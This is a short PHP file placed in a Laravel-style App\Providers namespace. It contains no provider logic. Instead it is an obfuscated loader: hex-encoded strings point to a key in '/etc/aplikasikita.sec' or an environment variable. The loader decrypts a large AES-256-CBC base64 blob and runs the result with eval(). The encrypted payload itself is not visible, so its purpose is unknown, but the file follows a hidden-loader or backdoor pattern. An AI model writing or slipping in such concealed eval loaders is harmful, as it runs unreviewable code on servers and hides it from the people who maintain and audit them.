<?php
namespace App\Providers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('tUwVZacQK+IGUG3QWggK6w==');

$c=base64_decode(

'/dcIx9z9MX/YuJeGgyNsDDbV1gGCM9IGIo2mna//2SA4A3OSImNF2Enio9UGdefwuFLIQxvAIBqr' .
'mABIs/WKaqemK5ElpUGVxydcxC7goNDhNB5usgVR/mxHFo5TLME8wsnNXFtDeFV2fnZYftV7xTcW' .
'zexIJ2Y4dYlEPZBnWi6WxKynDGes8AKlJj76b/FZGogDDYesXSzYbXDb/k9dC8y0Mph6BryDS22h' .
'eiYEhI7vwk0wxjKOeLvnDJGKujGAH6EbyW5dxA5jUI/6dl6oQrNANt9fEbYDC6zH/phzwGQ1fwS6' .
'6eCcXsgbkgmxDml0YywXUa0lCrOwWeqwXJcSeM+Dg6JaSO5TljSkJDNlns4ImNBt+tkDzQR13Sxh' .
'T+UAzcwC/QmCfVtIzdwfLlKEhSWLuoJ71k/rywppO6b+Wk3QuLKhmbl6XHMcIaDMm5cKg1y6B9cC' .
'+IXAlHSxRVDOKi0bAWiqmJE9mysoO4qE5VQehnxkkZXfIDQQHBYuiFrvbDSqAOeKfNIZmn+0SxiW' .
'IMDnT3YDnmTH66t5N6ci8/oTAMJN6aEdKh4hMBpZrKAB8XBMpsSQzICkMYwsXlnP4fMF4FNhmdQQ' .
'GImwVCm9FPJ91C6hkQWdsPwhYDToFpTFRaL7UnmXrDuL5wHzNKTluu9u5XXTDMlOtZyuPUY4PJt2' .
'IH2f2afv+RvxvVqc78LXKmyi7s+KTX8S7pvj6Bh8xMGt/4WDsUbX4t1OcSfQ/9cRfNnTyR88RKzr' .
'yjYDltp7x9H3RQw2KAnx/0gyR1nFCvFP35hgtoq1LZPIEnmJGROPz442/7bJtYmd/YntkQHYmDd5' .
'JFLTm4lqEC2pf3Rdsr7kNqKVuXGAnsaGziCLgZusNL1DH0c+fP5l4eXHYqqn1yLuuLkeyR8wlg3K' .
'zoaL7TFbiKJUD0uMkJbYQ5yeybDudYINvqUViTFBr3mVglDIbDGc2lvjX34zz2BjLQh4hQ4gqL42' .
'aR1QEzOKgmszjieu284hqxX5IKCi5LG3DJwbuJZeJNJlyFjIPeMcfqhgjbOSsDzMpy4TojKR50NM' .
'sH2+hNiQh0EOzmPd/8Dmwon4oeBDh9fHEKMUblw8/UHfzDW698M/KhRTQoU34oEeWkAY8remuI4Z' .
'H4J/m7e/Anpt7++oygESP1qo34bXz8jI+Y2SSTZfHLcYqERGTVaWjc5ugT5+6ALxkzQZtRMgZZgS' .
'3aXRv0TfZYow+BNQxOoHaOEyERoy37PTrzfyxeXwZAUeaPVmrzQxMYtmyVf020hLk5xOnHD6XsbE' .
'0xs5uZKyE01QbUOMyrbQc0iOTLupjVk95lHpeJDhCnJ1KGBnxB4SxVk/HeZxTZgT6XIU9Xr9yFwr' .
'9BNqIoY68HwkhCznGt0Yr+qoSuiGUhX6kFmpjbqCb04LUhy3BAwoJH6klnjjrOudk/xYAz73c9Q7' .
'heDv4DTFNo9j4PWro+vlnCa1GbXLtPl8RuEt2gUiQqgswgQ6ynM4vIFqOa2xtz1V5BhiAwtQNMsh' .
'26RkSCrjgKm5IYR9dmPX1Q+eegVKsUWv3zSTnfV5yYVHSEiMcHzHpw+aM+SDywftYB6J6aBV0SOr' .
'ydbGYEZCp02P9x4Jqe1VOvIUPfi8xiw3bpM/cGrmr9PWs7Y='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

